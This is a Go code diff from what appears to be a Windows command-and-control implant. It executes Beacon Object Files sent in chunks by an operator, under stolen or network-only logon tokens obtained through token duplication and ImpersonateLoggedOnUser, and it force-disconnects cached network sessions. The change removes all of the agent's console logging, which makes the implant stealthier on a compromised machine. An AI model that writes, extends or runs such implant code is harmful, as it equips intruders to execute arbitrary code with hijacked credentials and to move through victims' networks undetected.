@@ -35,7 +35,6 @@ func ensureTokenContextForBOF() func() {
 	defer globalTokenStore.mu.RUnlock()
 
 	var appliedToken syscall.Handle
-	var tokenName string
 
 	// Priority: Network-only token > Regular impersonation
 	if globalTokenStore.NetOnlyHandle != 0 {
@@ -51,10 +50,7 @@ func ensureTokenContextForBOF() func() {
 		)
 		if err == nil {
 			appliedToken = dupToken
-			tokenName = globalTokenStore.NetOnlyToken
-			fmt.Printf("[BOF Token] Applying network-only token '%s' for BOF execution\n", tokenName)
 		} else {
-			fmt.Printf("[BOF Token] Failed to duplicate network-only token: %v\n", err)
 		}
 	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
 		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {
@@ -70,10 +66,7 @@ func ensureTokenContextForBOF() func() {
 			)
 			if err == nil {
 				appliedToken = dupToken
-				tokenName = globalTokenStore.ActiveToken
-				fmt.Printf("[BOF Token] Applying impersonation token '%s' for BOF execution\n", tokenName)
 			} else {
-				fmt.Printf("[BOF Token] Failed to duplicate impersonation token: %v\n", err)
 			}
 		}
 	}
@@ -85,7 +78,6 @@ func ensureTokenContextForBOF() func() {
 	// Apply the token to the current thread
 	err := ImpersonateLoggedOnUser(appliedToken)
 	if err != nil {
-		fmt.Printf("[BOF Token] Failed to impersonate token: %v\n", err)
 		CloseHandle(appliedToken)
 		return func() {}
 	}
@@ -95,14 +87,12 @@ func ensureTokenContextForBOF() func() {
 	err = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
 	if err == nil {
 		threadToken.Close()
-		fmt.Printf("[BOF Token] Successfully impersonating with token '%s'\n", tokenName)
 	}
 
 	// Return cleanup function
 	return func() {
 		RevertToSelf()
 		CloseHandle(appliedToken)
-		fmt.Printf("[BOF Token] Reverted token context after BOF execution\n")
 	}
 }
 
@@ -126,8 +116,6 @@ func executeBOFPlatform(bofBytes []byte, args []byte) (string, error) {
 	}
 
 	// Otherwise execute normally without token context
-	fmt.Printf("[BOF Windows] Starting execution without token context, BOF size: %d bytes, Args size: %d bytes\n",
-		len(bofBytes), len(args))
 
 	output, err := Load(bofBytes, args)
 	if err != nil {
@@ -159,32 +147,25 @@ func parseBOFNetworkPath(args []byte) string {
 
 // executeBOFWithTokenContext ensures token context is properly applied for BOF execution
 func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
-	fmt.Printf("[BOF Windows] Executing with token context\n")
 
 	// Check what token we need to apply
 	globalTokenStore.mu.RLock()
 	var tokenToUse syscall.Handle
-	var tokenName string
 	var isNetOnly bool
 
 	if globalTokenStore.NetOnlyHandle != 0 {
 		tokenToUse = globalTokenStore.NetOnlyHandle
-		tokenName = globalTokenStore.NetOnlyToken
 		isNetOnly = true
-		fmt.Printf("[BOF Token] Using network-only token: %s\n", tokenName)
 	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
 		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {
 			tokenToUse = token
-			tokenName = globalTokenStore.ActiveToken
 			isNetOnly = false
-			fmt.Printf("[BOF Token] Using impersonation token: %s\n", tokenName)
 		}
 	}
 	globalTokenStore.mu.RUnlock()
 
 	if tokenToUse == 0 {
 		// No token to apply
-		fmt.Printf("[BOF Token] No valid token found, executing without impersonation\n")
 		return Load(bofBytes, args)
 	}
 
@@ -193,11 +174,9 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 		// Try to extract the network path from BOF arguments
 		networkPath := parseBOFNetworkPath(args)
 		if networkPath != "" {
-			fmt.Printf("[BOF Token] Disconnecting cached session for: %s\n", networkPath)
 			// Force disconnect with no update to profile
 			err := WNetCancelConnection2(networkPath, 0, true)
 			if err == nil {
-				fmt.Printf("[BOF Token] Successfully disconnected: %s\n", networkPath)
 			}
 
 			// Also try IPC$ share
@@ -217,7 +196,6 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 	}
 
 	// Apply impersonation for this BOF execution
-	fmt.Printf("[BOF Token] Applying impersonation for BOF execution\n")
 
 	// Duplicate the token for this specific operation
 	var dupToken syscall.Handle
@@ -230,7 +208,6 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 		&dupToken,
 	)
 	if err != nil {
-		fmt.Printf("[BOF Token] Failed to duplicate token: %v\n", err)
 		// Try with the original token
 		dupToken = tokenToUse
 	} else {
@@ -241,19 +218,16 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 	// Apply impersonation using ImpersonateLoggedOnUser
 	err = ImpersonateLoggedOnUser(dupToken)
 	if err != nil {
-		fmt.Printf("[BOF Token] ImpersonateLoggedOnUser failed: %v\n", err)
 		// Try to execute anyway without impersonation
 		return Load(bofBytes, args)
 	}
 
 	// Execute BOF with token context
-	fmt.Printf("[BOF Windows] Executing BOF with %s token context\n", tokenName)
 	output, execErr := Load(bofBytes, args)
 
 	// IMPORTANT: Always revert impersonation after BOF execution
 	// This prevents the impersonation from persisting on the thread
 	RevertToSelf()
-	fmt.Printf("[BOF Token] Reverted impersonation after BOF execution\n")
 
 	if execErr != nil {
 		return "", fmt.Errorf("COFF execution failed: %w", execErr)
@@ -270,8 +244,6 @@ func executeBOFPlatformAsync(bofBytes []byte, args []byte) (string, error) {
 
 	// For async BOF, we handle token context differently (in the goroutine)
 	// So just log and execute
-	fmt.Printf("[BOF Async Windows] Starting async execution with 30-minute timeout, BOF size: %d bytes, Args size: %d bytes\n",
-		len(bofBytes), len(args))
 
 	// Use LoadWithTimeout for 30-minute timeout
 	output, err := LoadWithTimeout(bofBytes, args, 30*time.Minute)
@@ -285,8 +257,6 @@ func executeBOFPlatformAsync(bofBytes []byte, args []byte) (string, error) {
 
 // processBOF is the Windows-specific implementation
 func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
-	startTime := time.Now()
-
 	// Handle multi-chunk BOF file uploads first
 	if cmd.TotalChunks > 1 && cmd.Data != "" {
 		return cq.handleChunkedBOF(cmd)
@@ -304,17 +274,13 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 	}
 
 	// Log BOF details and current token context
-	fmt.Printf("[BOF] Executing %s (size: %d bytes)\n", cmd.Filename, len(bofBytes))
 
 	// Debug: Log current token state
 	if globalTokenStore != nil {
 		globalTokenStore.mu.RLock()
 		if globalTokenStore.NetOnlyHandle != 0 {
-			fmt.Printf("[BOF] Network-only token is active: %s\n", globalTokenStore.NetOnlyToken)
 		} else if globalTokenStore.IsImpersonating {
-			fmt.Printf("[BOF] Impersonation token is active: %s\n", globalTokenStore.ActiveToken)
 		} else {
-			fmt.Printf("[BOF] No token context active\n")
 		}
 		globalTokenStore.mu.RUnlock()
 	}
@@ -328,7 +294,6 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 			// Parse the arguments using the lighthouse package format
 			parsedArgs, err := parseBOFArguments(argString)
 			if err != nil {
-				fmt.Printf("[BOF] Warning: Failed to parse arguments: %v\n", err)
 			} else {
 				bofArgs = parsedArgs
 			}
@@ -337,8 +302,6 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 
 	// Execute the BOF (token context is handled inside executeBOFPlatform)
 	output, err := executeBOFPlatform(bofBytes, bofArgs)
-	executionTime := time.Since(startTime)
-	fmt.Printf("[BOF] Execution completed in %v\n", executionTime)
 
 	// IMPORTANT: Clear the Filename field for BOF results
 	resultCmd := cmd
@@ -349,14 +312,9 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 
 	// For extremely large outputs, consider using async BOF or compression
 	if outputLen > MAX_SINGLE_RESPONSE {
-		fmt.Printf("[BOF] Large output (%d bytes), using optimized chunking\n", outputLen)
-
 		// Use larger chunks to reduce database operations
 		chunks := splitIntoChunks(output, MAX_CHUNK_SIZE)
 		totalChunks := len(chunks)
-
-		fmt.Printf("[BOF] Split into %d chunks (was going to be %d with old size)\n",
-			totalChunks, outputLen/(20*1024))
 
 		// Batch chunks together to reduce database operations
 		batchedResults := make([]*CommandResult, 0)
@@ -392,7 +350,6 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 				// Add all batched results at once
 				for _, result := range batchedResults {
 					if err := resultManager.AddResult(result); err != nil {
-						fmt.Printf("[BOF] Error queueing chunk: %v\n", err)
 					}
 				}
 
@@ -466,8 +423,6 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 	// Store this chunk
 	chunkInfo.Chunks[cmd.CurrentChunk] = cmd.Data
 
-	fmt.Printf("[BOF Chunks] Received chunk %d/%d for %s\n",
-		cmd.CurrentChunk+1, cmd.TotalChunks, cmd.Filename)
 
 	// Check if all chunks received
 	if len(chunkInfo.Chunks) < cmd.TotalChunks {
@@ -479,7 +434,6 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 	}
 
 	// All chunks received, reassemble and execute
-	fmt.Printf("[BOF Chunks] All chunks received for %s, reassembling...\n", cmd.Filename)
 
 	// Reassemble the BOF
 	var fullData strings.Builder
@@ -525,8 +479,6 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 
 	chunkInfo.Chunks[cmd.CurrentChunk] = cmd.Data
 
-	fmt.Printf("[BOF Async Chunks] Received chunk %d/%d for %s\n",
-		cmd.CurrentChunk+1, cmd.TotalChunks, cmd.Filename)
 
 	if len(chunkInfo.Chunks) < cmd.TotalChunks {
 		return CommandResult{
@@ -573,7 +525,6 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 			if len(args) > 0 {
 				packedArgs, err := PackArgs(args)
 				if err != nil {
-					fmt.Printf("[BOF Async] Warning: Failed to pack arguments: %v\n", err)
 				} else {
 					bofArgs = packedArgs
 				}
